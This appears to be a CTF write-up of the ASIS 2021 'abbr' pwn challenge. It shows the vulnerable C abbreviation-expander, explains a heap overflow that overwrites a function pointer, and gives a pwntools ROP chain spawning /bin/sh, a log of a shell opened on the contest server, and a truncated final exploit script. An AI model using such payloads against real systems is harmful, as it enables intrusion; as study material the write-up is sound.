<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rules.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Translator</span> &#123;</span></span><br><span class="line">  <span class="type">void</span> (*translate)(<span class="type">char</span>*);</span><br><span class="line">  <span class="type">char</span> *text;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">&#125; Translator;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">english_expand</span><span class="params">(<span class="type">char</span> *text)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, alen, blen;</span><br><span class="line">  Rule *r;</span><br><span class="line">  <span class="type">char</span> *p, *q;</span><br><span class="line">  <span class="type">char</span> *end = &amp;text[<span class="built_in">strlen</span>(text)<span class="number">-1</span>]; <span class="comment">// pointer to the last character</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Replace all abbreviations */</span></span><br><span class="line">  <span class="keyword">for</span> (p = text; *p; ++p) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(rules) / <span class="keyword">sizeof</span>(Rule); i++) &#123;</span><br><span class="line">      r = &amp;rules[i];</span><br><span class="line">      alen = <span class="built_in">strlen</span>(r-&gt;a);</span><br><span class="line">      blen = <span class="built_in">strlen</span>(r-&gt;b);</span><br><span class="line">      <span class="keyword">if</span> (strncasecmp(p, r-&gt;a, alen) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// i.e &quot;i&#x27;m pwn noob.&quot; --&gt; &quot;i&#x27;m pwn XXnoob.&quot;</span></span><br><span class="line">        <span class="keyword">for</span> (q = end; q &gt; p; --q)</span><br><span class="line">          *(q+blen-alen) = *q;</span><br><span class="line">        <span class="comment">// Update end</span></span><br><span class="line">        end += blen-alen;</span><br><span class="line">        *(end+<span class="number">1</span>) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// i.e &quot;i&#x27;m pwn XXnoob.&quot; --&gt; &quot;i&#x27;m pwn newbie.&quot;</span></span><br><span class="line">        <span class="built_in">memcpy</span>(p, r-&gt;b, blen);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Translator *<span class="title function_">translator_new</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">  Translator *t;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate region for text */</span></span><br><span class="line">  <span class="type">char</span> *text = (<span class="type">char</span>*)<span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>), size);</span><br><span class="line">  <span class="keyword">if</span> (text == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize translator */</span></span><br><span class="line">  t = (Translator*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Translator));</span><br><span class="line">  t-&gt;text = text;</span><br><span class="line">  t-&gt;size = size;</span><br><span class="line">  t-&gt;translate = english_expand;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">translator_reset</span><span class="params">(Translator *t)</span> &#123;</span><br><span class="line">  <span class="built_in">memset</span>(t-&gt;text, <span class="number">0</span>, t-&gt;size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">  Translator *t = translator_new(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">/* Input data */</span></span><br><span class="line">    translator_reset(t);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter text: &quot;</span>);</span><br><span class="line">    fgets(t-&gt;text, t-&gt;size, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;text[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Expand abbreviation */</span></span><br><span class="line">    t-&gt;translate(t-&gt;text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %s&quot;</span>, t-&gt;text);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>rules.h</code> looks like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *a; <span class="comment">// abbreviated string (i.e &quot;asap&quot;)</span></span><br><span class="line">  <span class="type">char</span> *b; <span class="comment">// expanded string (i.e &quot;as soon as possible&quot;)</span></span><br><span class="line">&#125; Rule;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Why are there so many abbreviations in English!!?? :exploding_head:</span></span><br><span class="line">Rule rules[] =</span><br><span class="line">  &#123;</span><br><span class="line">   &#123;.a=<span class="string">&quot;2f4u&quot;</span>, .b=<span class="string">&quot;too fast for you&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;4yeo&quot;</span>, .b=<span class="string">&quot;for your eyes only&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fyeo&quot;</span>, .b=<span class="string">&quot;for your eyes only&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aamof&quot;</span>, .b=<span class="string">&quot;as a matter of fact&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;afaik&quot;</span>, .b=<span class="string">&quot;as far as i know&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;afk&quot;</span>, .b=<span class="string">&quot;away from keyboard&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aka&quot;</span>, .b=<span class="string">&quot;also known as&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;b2k&quot;</span>, .b=<span class="string">&quot;back to keyboard&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;btk&quot;</span>, .b=<span class="string">&quot;back to keyboard&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;btt&quot;</span>, .b=<span class="string">&quot;back to topic&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;btw&quot;</span>, .b=<span class="string">&quot;by the way&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;b/c&quot;</span>, .b=<span class="string">&quot;because&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;c&amp;p&quot;</span>, .b=<span class="string">&quot;copy and paste&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;cys&quot;</span>, .b=<span class="string">&quot;check your settings&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;diy&quot;</span>, .b=<span class="string">&quot;do it yourself&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;eobd&quot;</span>, .b=<span class="string">&quot;end of business day&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;faq&quot;</span>, .b=<span class="string">&quot;frequently asked questions&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fka&quot;</span>, .b=<span class="string">&quot;formerly known as&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fwiw&quot;</span>, .b=<span class="string">&quot;for what it&#x27;s worth&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;fyi&quot;</span>, .b=<span class="string">&quot;for your information&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;jfyi&quot;</span>, .b=<span class="string">&quot;just for your information&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;hf&quot;</span>, .b=<span class="string">&quot;have fun&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;hth&quot;</span>, .b=<span class="string">&quot;hope this helps&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;idk&quot;</span>, .b=<span class="string">&quot;i don&#x27;t know&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;iirc&quot;</span>, .b=<span class="string">&quot;if i remember correctly&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;imho&quot;</span>, .b=<span class="string">&quot;in my humble opinion&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;imo&quot;</span>, .b=<span class="string">&quot;in my opinion&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;imnsho&quot;</span>, .b=<span class="string">&quot;in my not so humble opinion&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;iow&quot;</span>, .b=<span class="string">&quot;in other words&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;itt&quot;</span>, .b=<span class="string">&quot;in this thread&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;dgmw&quot;</span>, .b=<span class="string">&quot;don&#x27;t get me wrong&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;mmw&quot;</span>, .b=<span class="string">&quot;mark my words&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;nntr&quot;</span>, .b=<span class="string">&quot;no need to reply&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;noob&quot;</span>, .b=<span class="string">&quot;newbie&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;noyb&quot;</span>, .b=<span class="string">&quot;none of your business&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;nrn&quot;</span>, .b=<span class="string">&quot;no reply necessary&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;otoh&quot;</span>, .b=<span class="string">&quot;on the other hand&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;rtfm&quot;</span>, .b=<span class="string">&quot;read the fine manual&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;scnr&quot;</span>, .b=<span class="string">&quot;sorry, could not resist&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;sflr&quot;</span>, .b=<span class="string">&quot;sorry for late reply&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tba&quot;</span>, .b=<span class="string">&quot;to be announced&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tbc&quot;</span>, .b=<span class="string">&quot;to be continued&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tia&quot;</span>, .b=<span class="string">&quot;thanks in advance&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tq&quot;</span>, .b=<span class="string">&quot;thank you&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tyvm&quot;</span>, .b=<span class="string">&quot;thank you very much&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;tyt&quot;</span>, .b=<span class="string">&quot;take your time&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;ttyl&quot;</span>, .b=<span class="string">&quot;talk to you later&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;wfm&quot;</span>, .b=<span class="string">&quot;works for me&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;wtf&quot;</span>, .b=<span class="string">&quot;what the fuck&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;wrt&quot;</span>, .b=<span class="string">&quot;with regard to&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;ymmd&quot;</span>, .b=<span class="string">&quot;you made my day&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;icymi&quot;</span>, .b=<span class="string">&quot;in case you missed it&quot;</span>&#125;,</span><br><span class="line">   <span class="comment">// pwners abbreviations</span></span><br><span class="line">   &#123;.a=<span class="string">&quot;rop &quot;</span>, .b=<span class="string">&quot;return oriented programming &quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;jop &quot;</span>, .b=<span class="string">&quot;jump oriented programming &quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;cop &quot;</span>, .b=<span class="string">&quot;call oriented programming &quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aar&quot;</span>, .b=<span class="string">&quot;arbitrary address read&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;aaw&quot;</span>, .b=<span class="string">&quot;arbitrary address write&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;www&quot;</span>, .b=<span class="string">&quot;write what where&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;oob&quot;</span>, .b=<span class="string">&quot;out of bounds&quot;</span>&#125;,</span><br><span class="line">   &#123;.a=<span class="string">&quot;ret2&quot;</span>, .b=<span class="string">&quot;return to &quot;</span>&#125;,</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>The main stuff is in <code>english_expand</code> function which is looking for an abreviation in the user input. If it finds the abbreviation, all the data after the occurence will be written further according to the length of the full expression.<br>The attack idea is fairly simple, the <code>text</code> variable is allocated right before the <code>Translator</code> structure, and so in the heap they will be contiguous. Given that, we know that if we send 0x1000 bytes in the chunk contained by <code>text</code> and that we put an abbreviation of the right length we can overwrite the <code>translate</code> function pointer.</p>
<p>I will not describe in details how we can find the right size for the abbreviation or the length off the necessary padding.<br>An interesting abbreviation is the <code>www</code>, which stands for “write what where” (what a nice abbreviation for a pwner lmao), indeed the expanded expression has a length of 16 bytes.<br>So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadget)</code>, we will overflow the 32 first bytes next the <code>text</code> chunk, and in this rewrite the <code>translator</code> function pointer.</p>
<h2 id="ROPchain-1"><a href="#ROPchain-1" class="headerlink" title="ROPchain"></a>ROPchain</h2><p>Once that’s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.<br>Lets take a look at the values of the registers when we trigger the function pointer:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi</span><br><span class="line"> RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0</span><br><span class="line"> RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp</span><br><span class="line"> RDI  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi</span><br><span class="line"> RSI  0x4c9943 (_IO_2_1_stdin_+131) ◂— 0x4cc020000000000a /* &#x27;\n&#x27; */</span><br><span class="line"> R8   0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x49e522 ◂— &#x27;Enter text: &#x27;</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4030e0 (__libc_csu_fini) ◂— endbr64 </span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x4c9018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x44fd90 (__strcpy_avx2) ◂— endbr64 </span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffdef1b8230 —▸ 0x403040 (__libc_csu_init) ◂— endbr64 </span><br><span class="line"> RSP  0x7ffdef1b8220 ◂— 0x0</span><br><span class="line"> RIP  0x402036 (main+190) ◂— call   rdx</span><br></pre></td></tr></table></figure>
<p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.<br>So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn’t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that’s perfect!</p>
<p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that’s enough to get a shell!</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004126e3 : call qword ptr [rax]</span></span><br><span class="line"><span class="comment"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000405121 : xchg eax, esp ; ret</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&quot;wwwwww&quot;</span></span><br><span class="line">pld += <span class="string">b&quot;A&quot;</span>*(<span class="number">0x1000</span>-<span class="number">16</span>) + pwn.p64(<span class="number">0x0000000000405121</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter text: &quot;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000045a8f7 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000404cfe : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004018da : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004017df : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line"></span><br><span class="line">DATA_SEC = <span class="number">0x0000000004c90e0</span></span><br><span class="line">POP_RDI = <span class="number">0x00000000004018da</span></span><br><span class="line">POP_RSI = <span class="number">0x0000000000404cfe</span></span><br><span class="line">POP_RAX = <span class="number">0x000000000045a8f7</span></span><br><span class="line">POP_RDX = <span class="number">0x00000000004017df</span></span><br><span class="line">MOV_PTR_RDI_RSI = <span class="number">0x000000000045684f</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004012e3</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(POP_RDI)</span><br><span class="line">pld += pwn.p64(DATA_SEC)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(MOV_PTR_RDI_RSI)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RAX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br></pre></td></tr></table></figure>

<p>We launch the script with the right arguments and we correctly pop a shell!</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 </span><br><span class="line">[*] &#x27;/home/nasm/pwn/asis2021/abbr.d/abbr&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Opening connection to 168.119.108.148 on port 10010: Done</span><br><span class="line">/home/nasm/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=999(pwn) gid=999(pwn) groups=999(pwn)</span><br><span class="line">$ ls</span><br><span class="line">chall</span><br><span class="line">flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt</span><br><span class="line">$ cat flag-5db495dbd5a2ad0c090b1cc11e7ee255.txt</span><br><span class="line">ASIS&#123;d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Final-exploit"><a href="#Final-exploit" class="headerlink" title="Final exploit"></a>Final exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe  = pwn.context.binary = pwn.ELF(<span class="string">&#x27;abbr&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> 